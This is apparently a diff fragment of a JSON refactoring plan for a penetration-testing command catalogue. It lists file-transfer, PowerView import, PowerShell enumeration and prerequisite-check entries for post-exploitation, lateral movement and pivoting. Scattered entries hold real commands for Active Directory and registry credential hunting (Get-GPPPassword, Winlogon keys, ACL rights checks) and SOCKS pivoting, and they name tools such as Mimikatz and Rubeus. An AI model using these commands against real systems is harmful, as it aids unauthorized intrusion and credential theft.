+        "text": "Transfer LinEnum.sh",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "transfer-linenum-sh",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Transfer script",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "transfer-script",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Transfer pspy64/pspy32",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "transfer-pspy-pspy",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Transfer PowerUp.ps1",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "import-powerup",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Transfer PrivescCheck.ps1",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "transfer-privesccheck-ps",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Transfer Seatbelt.exe",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "transfer-seatbelt-exe",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "# Install ClamAV on Windows test system:\n# Download from: https://www.clamav.net/downloads",
+        "file": "data/commands/av-evasion/signature-evasion.json",
+        "suggested_id": "install-clamav-on",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Use existing file upload functionality",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "use-existing-file",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Python Flask upload server",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "python-flask-upload",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Copy from Volume Shadow Copies",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "copy-from-volume",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Transfer linpeas.sh via file transfer methods",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "transfer-linpeas-sh",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Upload via Python HTTP server",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "upload-via-python",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Transfer manually and run: ./linpeas.sh",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "transfer-manually-and",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "Download from: https://live.sysinternals.com/PsExec64.exe",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+        "suggested_id": "download-from-https",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "download + local cat",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json",
+        "suggested_id": "download-local-cat",
+        "preservation_note": "Create file transfer command"
+      },
+      {
+        "text": "updog - HTTP server with upload support (pip install updog)",
+        "file": "data/commands/pivoting/linux-utilities.json",
+        "suggested_id": "updog-http-server",
+        "preservation_note": "Create file transfer command"
+      }
+    ],
+    "CREATE_UTILITY_CMD": [
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "chmod-executable",
+        "preservation_note": "Create permission management command"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "chmod-executable",
+        "preservation_note": "Create permission management command"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "chmod-executable",
+        "preservation_note": "Create permission management command"
+      }
+    ],
+    "CREATE_IMPORT_CMD": [
+      {
+        "text": "Import SharpHound data",
+        "file": "data/commands/generated/post-exploitation-additions.json",
+        "suggested_id": "import-sharphound",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView: . .\\PowerView.ps1",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Create PowerShell import command"
+      }
+    ],
+    "CREATE_PS_CMD": [
+      {
+        "text": "Get-CimInstance win32_process",
+        "file": "data/commands/monitoring/process-enumeration.json",
+        "suggested_id": "get-ciminstance-win",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ComputerInfo (PowerShell)",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "get-computerinfo-powershell",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "PowerUp's Get-UnquotedService",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-powerup",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "PowerUp's Get-ModifiableServiceFile",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-powerup",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "PowerUp's Get-RegistryAlwaysInstallElevated",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-powerup",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ADUser $env:USERNAME",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "get-aduser",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "get-itemproperty-hklm",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ScheduledTask | Select TaskName,Principal",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "get-scheduledtask-select",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "get-acl-hklm",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "get-itemproperty-hklm",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+        "suggested_id": "get-aduser",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+        "suggested_id": "get-netgroup",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ADUser -Filter *",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+        "suggested_id": "get-aduser",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+        "suggested_id": "get-netgroup",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "get-aduser",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-GPPPassword (PowerSploit)",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "get-gpppassword-powersploit",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json",
+        "suggested_id": "get-netgroup",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json",
+        "suggested_id": "get-netgroup",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-NetUser -AdminCount",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json",
+        "suggested_id": "get-netuser",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-Acl",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "get-acl",
+        "preservation_note": "Create PowerShell cmdlet command"
+      },
+      {
+        "text": "Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty'}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "get-objectacl-activedirectoryrights",
+        "preservation_note": "Create PowerShell cmdlet command"
+      }
+    ],
+    "EXTRACT_COMMAND": [
+      {
+        "text": "Manual check with: sc qc <servicename>",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "manual-check-with",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Check nmap version: nmap --version (if < 5.21, interactive works)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json",
+        "suggested_id": "check-nmap-version",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Manual binary analysis: strings /path/to/binary",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json",
+        "suggested_id": "manual-binary-analysis",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Check specific binary: getcap /usr/bin/python3 (test known binary)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "check-specific-binary",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Manual check: Look for 'CN=Users' or 'CN=Groups' in DN path",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "manual-check-look",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Manual attribute inspection: $script:AllUsers[-1].Properties | select description,info,comment",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "manual-attribute-inspection",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Check module path: (Get-Module PowerView).Path | Select-String -Pattern 'version'",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+        "suggested_id": "import-powerview",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Check for AllExtendedRights (includes ForceChangePassword): Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "check-for-allextendedrights",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Manual enumeration: Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json",
+        "suggested_id": "manual-enumeration-get",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Check robots.txt first: curl http://<TARGET>/robots.txt",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "check-robots-txt",
+        "preservation_note": "Extract embedded command and create entry"
+      },
+      {
+        "text": "Check for rate limiting: Test with small wordlist first",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "check-for-rate",
+        "preservation_note": "Extract embedded command and create entry"
+      }
+    ]
+  },
+  "detailed_plan": {
+    "powershell_imports": [
+      {
+        "text": "Import SharpHound data",
+        "count": 1,
+        "category": "powershell_import",
+        "action": "CREATE_IMPORT_CMD",
+        "preservation_note": "Create PowerShell import command",
+        "suggested_id": "import-sharphound",
+        "sample_file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "count": 30,
+        "category": "powershell_import",
+        "action": "CREATE_IMPORT_CMD",
+        "preservation_note": "Create PowerShell import command",
+        "suggested_id": "import-powerview",
+        "sample_file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView: . .\\PowerView.ps1",
+        "count": 1,
+        "category": "powershell_import",
+        "action": "CREATE_IMPORT_CMD",
+        "preservation_note": "Create PowerShell import command",
+        "suggested_id": "import-powerview",
+        "sample_file": "data/commands/enumeration/ad-powerview-core.json"
+      }
+    ],
+    "powershell_cmdlets": [
+      {
+        "text": "Get-CimInstance win32_process",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-ciminstance-win",
+        "sample_file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "Get-ComputerInfo (PowerShell)",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-computerinfo-powershell",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Get-UnquotedService",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "import-powerup",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Get-ModifiableServiceFile",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "import-powerup",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Get-RegistryAlwaysInstallElevated",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "import-powerup",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ADUser $env:USERNAME",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-aduser",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-itemproperty-hklm",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ScheduledTask | Select TaskName,Principal",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-scheduledtask-select",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-acl-hklm",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-itemproperty-hklm",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+        "count": 2,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-aduser",
+        "sample_file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "count": 4,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-netgroup",
+        "sample_file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-ADUser -Filter *",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-aduser",
+        "sample_file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-GPPPassword (PowerSploit)",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-gpppassword-powersploit",
+        "sample_file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Get-NetUser -AdminCount",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-netuser",
+        "sample_file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "Get-Acl",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-acl",
+        "sample_file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty'}",
+        "count": 1,
+        "category": "powershell_cmdlet",
+        "action": "CREATE_PS_CMD",
+        "preservation_note": "Create PowerShell cmdlet command",
+        "suggested_id": "get-objectacl-activedirectoryrights",
+        "sample_file": "data/commands/enumeration/ad-powerview-permissions.json"
+      }
+    ],
+    "verification_commands": [
+      {
+        "text": "NTLM hash obtained",
+        "count": 5,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "verify-ntlm-hash",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Neo4j running",
+        "count": 2,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "neo-j-running",
+        "sample_file": "data/commands/generated/active-directory-additions.json"
+      },
+      {
+        "text": "docker pull alpine (if no images available)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "docker-pull-alpine",
+        "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "wget if curl unavailable",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "wget-if-curl",
+        "sample_file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use wget/curl if available",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "use-wget-curl",
+        "sample_file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "getcap utility installed (part of libcap package)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "getcap-utility-installed",
+        "sample_file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "nmap -sn <SUBNET> (if dsquery unavailable)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "nmap-sn-subnet",
+        "sample_file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "PowerView imported",
+        "count": 2,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "import-powerview",
+        "sample_file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "sqli-union-mysql-info (if SQL injection available)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "sqli-union-mysql",
+        "sample_file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "sqli-union-postgresql-info (if SQL injection available)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "sqli-union-postgresql",
+        "sample_file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "Impacket installed on Kali",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "impacket-installed-on",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "nmap installed (default on Kali)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "nmap-installed-default",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "count": 4,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "verify-crackmapexec-installed",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "nmap installed on Kali (pre-installed)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "nmap-installed-on",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "Evil-WinRM installed on Kali",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "evil-winrm-installed",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "Mimikatz available",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "import-mimikatz",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Rubeus.exe available",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "rubeus-exe-available",
+        "sample_file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Nmap installed: sudo apt install nmap",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "nmap-installed-sudo",
+        "sample_file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "plink-remote-forward - Windows alternative using Plink when OpenSSH unavailable",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "plink-remote-forward",
+        "sample_file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "Socat installed on pivot host: which socat (if not found: sudo apt install socat)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "socat-installed-on",
+        "sample_file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "RDP service running on target: nmap -p 3389 -Pn <TARGET>",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "rdp-service-running",
+        "sample_file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "Python available on pivot host: which python3 (usually present by default)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "python-available-on",
+        "sample_file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <SOCKS_PORT> or ssh -R <SOCKS_PORT> (remote dynamic)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "socks-proxy-running",
+        "sample_file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <PORT> or ssh -R <PORT>",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "socks-proxy-running",
+        "sample_file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
